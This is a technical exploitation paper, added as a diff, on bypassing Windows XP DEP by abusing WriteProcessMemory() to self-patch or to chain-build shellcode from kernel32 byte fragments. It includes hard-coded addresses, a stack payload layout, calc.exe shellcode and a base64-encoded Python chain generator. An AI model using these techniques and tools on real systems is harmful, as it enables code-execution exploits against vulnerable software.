@@ -1,0 +1,378 @@
+                  
+  !--------------------------------------------------------------------------!
+  !-----------=|     Exploitation With WriteProcessMemory()     |=-----------!
+  !-----------=|              Yet Another DEP Trick             |=-----------!
+  !-----------=|                       ----                     |=-----------! 
+  !-----------=|            Written By Spencer Pratt            |=-----------!
+  !-----------=|            spencer.w.pratt () gmail com           |=-----------!
+  !--------------------------------------------------------------------------!
+  !--=[ dd6c2309cab71bdb3aabce69cacb6f5f6c0e2d60bd51d6f629904553a8dc0a7c ]=--!
+  !--=[ 5db5cef0f8e0a630d986b91815336bc9a81ebe5dbd03f1edaddde77e58eb2dba ]=--!
+  !--------------------------------------------------------------------------!
+
+
+
+                ----=!#[     Table of Contents     ]#!=----
+                ---                                     ---
+                --  I.       Introduction                -- 
+                --  II.      Background Information      -- 
+                --  III.     WriteProcessMemory()        -- 
+                --  VI.      Slightly Clever             -- 
+                --  VII.     Return Chaining             --                  
+                --  VIII.    Conclusions                 -- 
+                --  IX.      Special Thanks, Greets      -- 
+                ---                                     --- 
+                ------------------------------------------- 
+
+
+
+  ----------------------=![      Introduction      ]!=------------------------
+
+  This paper introduces yet another function to defeat Windows DEP. It is
+  assumed that the reader is already familiar with buffer overflows on x86,
+  and has a basic understanding of the DEP protection mechanism. The technique
+  discussed in this paper is aimed at Windows XP, however, it should also work
+  on other Windows versions given that the attacker has some way to find the 
+  address of the DLL, such as through a memory disclosure, etc. This paper
+  does not address the issue of ASLR, rather it recognizes ASLR as a
+  completely separate problem. The method described here is not conceptually 
+  groundbreaking, and is ultimately only as impressive as any other ret-2-lib
+  technique.  
+  
+
+
+  -----------------=! [      Background Information      ] !=-----------------
+  
+  The introduction of DEP and other mechanisms has slightly raised the bar for
+  exploitation on Windows. Variations on the ret-2-lib technique have been 
+  used in order to circumvent DEP. Some popular functions are:
+
+    - WinExec() to execute a command: still useful but not as desirable as 
+      having arbitrary shellcode execution.
+
+    - VirtualProtect() to make memory executable: still useful, but often 
+      requires ROP.
+
+    - VirtualAlloc() to allocate new executable memory: still useful but 
+      often requires ROP.
+
+    - SetProcessDEPPolicy() to disable DEP: doesn't work if DEP is AlwaysOn, 
+      and may only be called once per process.
+
+    - NtSetProcessInformation() to disable DEP: this function fails if 
+      AlwaysOn or MEM_EXECUTE_OPTION_PERMANENT flag is set.
+
+
+
+  ------------------=! [      WriteProcessMemory()      ] !=------------------
+
+  If you can't go to the mountain, bring the mountain to you.
+
+  The function WriteProcessMemory() is typically used for debugging, and as 
+  defined by MSDN it:
+
+     "Writes data to an area of memory in a specified process. The entire 
+     area to be written must be accessible or the operation fails."
+
+  The function takes the following arguments:
+
+  WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, 
+           SIZE_T nSize, SIZE_T *lpNumberBytesWritten);
+
+  The idea here is simple: if it is not possible execute the writable memory, 
+  write to the executable memory instead. By returning to WriteProcessMemory() 
+  it is possible to write arbitrary code into a running thread, effectively
+  hot-patching it with shellcode. This works because WriteProcessMemory() 
+  performs the required privilege changes using NtProtectVirtualMemory() to 
+  allow the memory to be written to, regardless of being marked as executable.
+
+
+
+  --------------------=! [      Slightly Clever      ] !=---------------------
+
+  The caveats of WriteProcessMemory() introduce a couple of problems to solve
+  before the function is eligible for exploitation. First, finding a suitable
+  location to patch can be a difficult task. Second, the final argument needs
+  to be NULL or a pointer to memory where the lpNumberBytesWritten is stored.
+  As luck would have it, there is an easy solution to handle both issues: use
+  the WriteProcessMemory() function to write to itself. 
+
+  Using WriteProcessMemory() to patch itself removes the requirement of 
+  finding a location in a thread to patch, as the destination address is now
+  offset from the known address of WriteProcessMemory(). It also removes the 
+  need for a second jmp/call to the patched location, as the natural flow of
+  execution will walk directly into the patched code. Finally, by carefully 
+  picking the offset into WriteProcessMemory() to patch, it eliminates the 
+  need for the last pointer argument (or NULL), by overwriting the code that
+  performs the pointer check and then stores the lpNumberBytesWritten.
+  
+  Finding a suitable location to write code to inside WriteProcessMemory() is
+  easy. Observe the function code snip below:
+  
+    WindowsXP kernel32.dll, WriteProcessMemory 0x7C802213+...
+      ...
+      7C8022BD:  lea     eax, [ebp + hProcess]
+      7C8022C0:  push    eax
+      7C8022C1:  push    ebx
+      7C8022C2:  push    [ebp + lpBuffer]
+      7C8022C5:  push    [ebp + lpBaseAddress]
+      7C8022C8:  push    edi
+      7C8022C9:  call    NtWriteVirtualMemory
+      7C8022CF:  mov     [ebp + lpBuffer], eax
+      7C8022D2:  mov     eax, [ebp + lpNumberBytesWritten]
+      7C8022D5:  test    eax, eax
+      7C8022D7:  jz      short 7C8022DE
+      ...
+  
+  The last operation that needs to complete in order to successfully patch
+  the process is the call to NtWriteVirtualMemory() at 0x7C8022C9. The setup 
+  for storing lpNumberBytesWritten starts afterwards, and so 0x7C8022CF is 
+  the ideal destination address to begin overwriting. Immediately after the 
+  write is completed the function flows directly into the freshly written
+  code. This allows the bypass of permanent DEP in one call.
+
+  The arguments to do this look like this:
+
+  WriteProcessMemory(-1, 0x7C8022CF, ShellcodeAddr, ShellcodeLen, ..Arbitrary)
+
+  The first argument, -1 for hProcess HANDLE, specifies the current process.
+  The second argument is the offset into WriteProcessMemory() where shellcode
+  will be written. The third argument, ShellcodeAddr, needs to be the address
+  of shellcode stored somewhere in memory; this could be code that has been 
+  sprayed onto the heap, or at a location disclosed by the application. The 
+  fourth argument is the length of shellcode to copy. The last argument is no
+  longer relevant as the code that deals with it is being overwritten by the 
+  copy itself. 
+
+  For a textbook example stack overflow this payload layout looks like:
+	
+  [0x7C802213] [AAAA] [0xffffffff] [0x7C8022CF] [&shellcode] [length]
+  ^            ^      ^            ^            ^            ^
+  '            '      '            '            '            '
+  '            '      '            '            '            shellcode length
+  '            '      '            '            '
+  '            '      '            '            shellcode address
+  '            '      '            '                  
+  '            '      '            dest address in WriteProcessMemory()
+  '            '      '
+  '            '      hProcess HANDLE (-1)
+  '            '
+  '            next return address (irrelevant)
+  '
+  WriteProcessMemory() address, overwritten EIP
+
+
+
+  --------------------=! [      Return Chaining      ] !=---------------------
+
+  The technique as described is still imperfect: it requires knowing where
+  shellcode is in memory. Ideally, the location of the WriteProcessMemory() 
+  function (kernel32.dll) should be all that is required to successfully land
+  arbitrary code execution. Consider a scenario where control of the stack is
+  gained, but the location of the stack or orther data (other than the address
+  of WriteProcessMemory) is unknown. By chaining multiple calls together to 
+  copy from offsets of known data, WriteProcessMemory() can be used to build
+  shellcode dynamically from already existing code.
+
+  In order to perform this, the following steps need to be taken:
+
+    1. Locate offsets for the op codes and data to compose the shellcode with.
+
+    2. Identify a location with enough space to patch, which does not conflict
+       with any of the locations being copied from.
+	
+    3. Perform multiple returns to WriteProcessMemory(), patching the location
+       with shellcode chunks from offsets.
+
+    4. Return to newly patched shellcode.
+
+  Step 1 of this process allows for some space optimization. Searching for 
+  and finding multibyte sequences of the desired shellcode (rather than just 
+  single bytes) allows for fewer returns to WriteProcessMemory(), and thus 
+  less required space for the chained stack arguments.
+
+  Consider generic win32 calc.exe shellcode from Metasploit as an example:
+
+  \xfc\xe8\x44\x00\x00\x00\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18
+  \x8b\x5f\x20\x01\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74
+  \x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x04\x75\xe5\x8b\x5f\x24\x01
+  \xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x8b\x1c\x8b\x01\xeb\x89\x5c\x24
+  \x04\xc3\x5f\x31\xf6\x60\x56\x64\x8b\x46\x30\x8b\x40\x0c\x8b\x70\x1c\xad
+  \x8b\x68\x08\x89\xf8\x83\xc0\x6a\x50\x68\x7e\xd8\xe2\x73\x68\x98\xfe\x8a
+  \x0e\x57\xff\xe7\x63\x61\x6c\x63\x2e\x65\x78\x65\x00
+
+  By breaking this shellcode down into every possible unique chunk of 2 bytes
+  or more, and then searching for it in kernel32.dll, it is easy to find the 
+  pieces to dynamically construct this code. Of course, not all of this code 
+  will be available in multibyte sequences. In turn some of the pieces will 
+  need to be copied in as single bytes. Here is the output from an automated 
+  scan for these sequences, code to build this table is provided later on:
+
+     ________________________________________________________ 
+    |----    Bytes    ----------   PE/DLL   ---    WPM()  ---|
+    |--------------------------------------------------------|
+    |  shellcode[000-001]        0x7c8016d9 -->  0x7c861967  |
+    |  shellcode[001-006]        0x7c81b11c -->  0x7c861968  |
+    |  shellcode[006-010]        0x7c8285e3 -->  0x7c86196d  |
+    |  shellcode[010-012]        0x7c801e3c -->  0x7c861971  |
+    |  shellcode[012-014]        0x7c804714 -->  0x7c861973  |
+    |  shellcode[014-015]        0x7c801aa6 -->  0x7c861975  |
+    |  shellcode[015-018]        0x7c87acf4 -->  0x7c861976  |
+    |  shellcode[018-020]        0x7c80a2b1 -->  0x7c861979  |
+    |  shellcode[020-022]        0x7c804664 -->  0x7c86197b  |
+    |  shellcode[022-025]        0x7c84266b -->  0x7c86197d  |
+    |  shellcode[025-026]        0x7c801737 -->  0x7c861980  |
+    |  shellcode[026-028]        0x7c80473a -->  0x7c861981  |
+    |  shellcode[028-030]        0x7c81315c -->  0x7c861983  |
+    |  shellcode[030-032]        0x7c802b44 -->  0x7c861985  |
+    |  shellcode[032-034]        0x7c81a061 -->  0x7c861987  |
+    |  shellcode[034-037]        0x7c812ae7 -->  0x7c861989  |
+    |  shellcode[037-038]        0x7c801639 -->  0x7c86198c  |
+    |  shellcode[038-040]        0x7c841d31 -->  0x7c86198d  |
+    |  shellcode[040-042]        0x7c8047a7 -->  0x7c86198f  |
+    |  shellcode[042-044]        0x7c8121da -->  0x7c861991  |
+    |  shellcode[044-047]        0x7c80988f -->  0x7c861993  |
+    |  shellcode[047-048]        0x7c8016dc -->  0x7c861996  |
+    |  shellcode[048-051]        0x7c84a0d0 -->  0x7c861997  |
+    |  shellcode[051-052]        0x7c801a8a -->  0x7c86199a  |
+    |  shellcode[052-054]        0x7c802e41 -->  0x7c86199b  |
+    |  shellcode[054-055]        0x7c8016fb -->  0x7c86199d  |
+    |  shellcode[055-059]        0x7c84bb29 -->  0x7c86199e  |
+    |  shellcode[059-062]        0x7c80a2b1 -->  0x7c8619a2  |
+    |  shellcode[062-063]        0x7c801677 -->  0x7c8619a5  |
+    |  shellcode[063-065]        0x7c8210f4 -->  0x7c8619a6  |
+    |  shellcode[065-067]        0x7c801e9a -->  0x7c8619a8  |
+    |  shellcode[067-068]        0x7c801677 -->  0x7c8619aa  |
+    |  shellcode[068-070]        0x7c821d86 -->  0x7c8619ab  |
+    |  shellcode[070-071]        0x7c8019ba -->  0x7c8619ad  |
+    |  shellcode[071-072]        0x7c801649 -->  0x7c8619ae  |
+    |  shellcode[072-073]        0x7c8016dc -->  0x7c8619af  |
+    |  shellcode[073-075]        0x7c832d0b -->  0x7c8619b0  |
+    |  shellcode[075-076]        0x7c8023e4 -->  0x7c8619b2  |
+    |  shellcode[076-078]        0x7c86a706 -->  0x7c8619b3  |
+    |  shellcode[078-080]        0x7c80e11b -->  0x7c8619b5  |
+    |  shellcode[080-083]        0x7c8325a2 -->  0x7c8619b7  |
+    |  shellcode[083-087]        0x7c840db2 -->  0x7c8619ba  |
+    |  shellcode[087-089]        0x7c812ff8 -->  0x7c8619be  |
+    |  shellcode[089-091]        0x7c82be3c -->  0x7c8619c0  |
+    |  shellcode[091-093]        0x7c802552 -->  0x7c8619c2  |
+    |  shellcode[093-094]        0x7c80168e -->  0x7c8619c4  |
+    |  shellcode[094-097]        0x7c81cd28 -->  0x7c8619c5  |
+    |  shellcode[097-100]        0x7c812cc3 -->  0x7c8619c8  |
+    |  shellcode[100-101]        0x7c80270d -->  0x7c8619cb  |
+    |  shellcode[101-102]        0x7c80166b -->  0x7c8619cc  |
+    |  shellcode[102-103]        0x7c801b17 -->  0x7c8619cd  |
+    |  shellcode[103-105]        0x7c804d40 -->  0x7c8619ce  |
+    |  shellcode[105-106]        0x7c802638 -->  0x7c8619d0  |
+    |  shellcode[106-108]        0x7c82c4af -->  0x7c8619d1  |
+    |  shellcode[108-111]        0x7c85f0b6 -->  0x7c8619d3  |
+    |  shellcode[111-112]        0x7c80178f -->  0x7c8619d6  |
+    |  shellcode[112-115]        0x7c804bed -->  0x7c8619d7  |
+    |  shellcode[115-116]        0x7c80232d -->  0x7c8619da  |
+    |  shellcode[116-121]        0x7c84eac0 -->  0x7c8619db  |
+    `-------------------------------------------------------´
+
+  As the scan shows, the shellcode is 121 bytes long, but using multibyte 
+  sequences allows this code to be built by chaining just 59 calls to 
+  WriteProcessMemory().
+
+  Step 2 differentiates this from the previous technique of patching
+  WriteProcessMemory() itself. In order to avoid accidentally overwriting some
+  useful area, and for overall simplicity, it is best pick the address of a 
+  disposable function or code area from kernel32.dll to overwrite. The example
+  used in this paper is the GetTempFileNameA() function at 0x7c861967, as this
+  code area has no overlap with WriteProcessMemory(), nor does it overlap with
+  any of the shellcode offsets.
+
+  Provided below is a base64 encoded zip of a python script to perform all of
+  these steps. It scans for and maps locations of shellcode pieces to the 
+  function at 0x7c861967. It prints the table displayed above, showing all of
+  the mapped locations, as well as writes an output file containing the stack
+  frames actually used to perform the return chaining. This can be decoded 
+  with:
+
+  $ base64 --decode pe_seance-base64.txt > pe_seance.py.zip
+  $ unzip pe_seance.py.zip
+
+  --- BEGIN CODE SNIP PE-SEANCE.PY.ZIP ---
+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
+AAABAAEAUgAAAOcLAAAAAA==
+  --- CODE SNIP PE-SEANCE.PY.ZIP ---
+
+
+
+  ----------------------=! [      Conclusions      ] !=-----------------------
+
+  WriteProcessMemory() offers DEP-bypassing functionality for multiple 
+  exploitation scenarios. In the scenario where a decent guess can be made for
+  the location of shellcode, this function proves to be a convenient single 
+  hop solution. Even when the location of shellcode is undetermined, so long  
+  as stack space is available to chain multiple returns, WriteProcessMemory()
+  is very helpful. 
+
+
+
+  -----------------=! [      Special Thanks, Greets      ] !=-----------------
+
+        1f4ca6c853366fb33a046255eecdefc8294af29a2686cb615ba72f6478458e0f 
+        ff90373ee3918440f3b8dda60e1992c63ea0a2f7f16d4c4efd8b8bfd29dced24
+        d63468c190831565296272ada04af1ef91d9d79a5edd9f8e3103faf8afff85c7
+        8a515aba265ce892546cd06342620b906222bfb6007a74ca5720742839d5aa67
+        a9a2f45d3897e197c0439ed973267e2339528eeb8ac2f2c35b088c02f34c5563
+
+
+  ---------------------=! [      End Of Message      ] !=---------------------
